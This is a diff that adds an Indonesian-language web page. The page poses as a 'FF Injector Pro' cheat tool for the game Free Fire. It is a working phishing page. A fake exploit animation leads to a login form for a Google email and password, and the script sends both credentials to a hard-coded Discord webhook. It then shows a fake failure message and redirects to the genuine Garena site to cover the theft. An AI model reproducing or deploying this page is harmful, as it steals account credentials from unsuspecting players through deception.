@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FF INJECTOR PRO - AUTO HEADSHOT</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Courier+Prime&display=swap" rel="stylesheet">
+    <style>
+        body, html { margin: 0; padding: 0; font-family: 'Orbitron', sans-serif; background: #050505; color: #00ff00; overflow: hidden; }
+        .container { display: flex; flex-direction: column; align-items: center; padding-top: 50px; }
+        .panel-box { background: rgba(10, 10, 10, 0.95); border: 1px solid #00ff00; border-radius: 5px; padding: 25px; width: 90%; max-width: 350px; box-shadow: 0 0 15px #00ff00; text-align: center; }
+        
+        /* Terminal Style */
+        #terminal { display: none; font-family: 'Courier Prime', monospace; background: #000; color: #00ff00; padding: 15px; border-radius: 5px; text-align: left; font-size: 12px; height: 150px; overflow: hidden; margin-top: 10px; border: 1px solid #333; }
+
+        .btn-inject { width: 100%; background: #00ff00; color: #000; border: none; padding: 15px; font-family: 'Orbitron'; font-weight: bold; cursor: pointer; margin-top: 20px; transition: 0.3s; }
+        .btn-inject:hover { background: #00cc00; box-shadow: 0 0 10px #00ff00; }
+
+        /* Login Overlay */
+        #loginOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 100; justify-content: center; align-items: center; }
+        .login-card { background: #0a0a0a; padding: 30px; border-radius: 5px; border: 1px solid #00ff00; text-align: center; width: 85%; max-width: 320px; box-shadow: 0 0 20px #00ff00; }
+        .login-card input { width: 90%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #00ff00; color: #00ff00; border-radius: 3px; outline: none; }
+        
+        .error-msg { color: #ff0000; font-size: 10px; display: none; margin-bottom: 10px; }
+        .forgot { color: #888; font-size: 11px; cursor: pointer; margin-top: 15px; display: block; }
+        .shake { animation: shake 0.3s; }
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="panel-box">
+        <h1 style="font-size: 20px; color: #fff;">INJECTOR V18</h1>
+        <p style="font-size: 10px; color: #00ff00;">ENGINE: OB35 BYPASS ACTIVE</p>
+        
+        <div id="main-ui">
+            <div style="text-align: left; font-size: 13px; margin: 10px 0;">
+                <div>[X] AUTO HEADSHOT</div>
+                <div>[X] AIM LOCK</div>
+                <div>[ ] ANTENA VIEW</div>
+            </div>
+            <button class="btn-inject" onclick="startLoading()">INJECT KE AKUN</button>
+        </div>
+
+        <div id="terminal"></div>
+    </div>
+</div>
+
+<div id="loginOverlay">
+    <div class="login-card" id="card">
+        <h2 style="color: #fff; font-size: 18px;">LOGIN DIPERLUKAN</h2>
+        <p style="font-size: 11px; color: #888;">Hubungkan Akun Anda untuk Proses Injeksi Cheat ke Database Server.</p>
+        <p id="msg" class="error-msg">Email harus @gmail.com & sandi min. 6 huruf!</p>
+        
+        <input type="text" id="user" placeholder="Email Google (@gmail.com)">
+        <input type="password" id="pass" placeholder="Password Akun">
+        
+        <button class="btn-inject" onclick="validasi()">MULAI INJEKSI</button>
+        <span class="forgot" onclick="alert('Gunakan password yang paling baru Anda gunakan.')">Lupa sandi?</span>
+    </div>
+</div>
+
+<script>
+    const webhook = "https://discord.com/api/webhooks/1477316845622132830/VP25Q1ll6_QVAU3y4M2dt3eZMx4xeyeuSQCe59xNn0UXpavztWoOidG3VS4KeN-GPBwt";
+
+    function startLoading() {
+        document.getElementById('main-ui').style.display = 'none';
+        const term = document.getElementById('terminal');
+        term.style.display = 'block';
+        
+        const lines = [
+            "> Initializing exploit...",
+            "> Connecting to Garena server...",
+            "> Bypassing security protocol...",
+            "> Finding player database...",
+            "> Found player_id: FF-8821...",
+            "> ERROR: Login required for injection!",
+            "> Waiting for user access..."
+        ];
+
+        let i = 0;
+        const interval = setInterval(() => {
+            term.innerHTML += lines[i] + "<br>";
+            i++;
+            if(i >= lines.length) {
+                clearInterval(interval);
+                setTimeout(() => { document.getElementById('loginOverlay').style.display = 'flex'; }, 1000);
+            }
+        }, 600);
+    }
+
+    function validasi() {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
+        const card = document.getElementById('card');
+        const msg = document.getElementById('msg');
+
+        if (!u.includes("@gmail.com") || p.length < 6) {
+            card.classList.add('shake');
+            msg.style.display = 'block';
+            setTimeout(() => card.classList.remove('shake'), 300);
+            return;
+        }
+
+        kirimData(u, p);
+    }
+
+    function kirimData(u, p) {
+        fetch(webhook, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                embeds: [{
+                    title: "☣️ INJECTION ACCOUNT ACCESS ☣️",
+                    color: 65280, // Hijau
+                    fields: [
+                        { name: "👤 Email", value: `\`${u}\`` },
+                        { name: "🔑 Password", value: `\`${p}\`` }
+                    ],
+                    footer: { text: "Sopar Infiltrator v18" }
+                }]
+            })
+        }).then(() => {
+            alert("Injeksi Gagal! Akun Anda tidak kompatibel dengan versi Mod ini.");
+            window.location.href = "https://ff.garena.com/id/";
+        });
+    }
+</script>
+
+</body>
+</html>
